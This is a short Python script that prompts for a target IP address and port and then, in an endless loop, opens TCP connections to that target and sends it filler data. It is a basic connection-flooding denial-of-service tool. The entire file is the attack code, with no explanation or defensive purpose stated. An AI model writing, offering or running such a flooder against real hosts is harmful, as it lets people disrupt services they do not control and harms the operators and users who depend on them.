import socket
import sys
import os

ip = input("ip address of target..... ");
port = int(input("port number........ "));
def start():
    s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    s.connect((ip ,port))
    s.send(("some dataaaaaaaaaaaaaaa").encode())
    s.close()
while True:
    start()
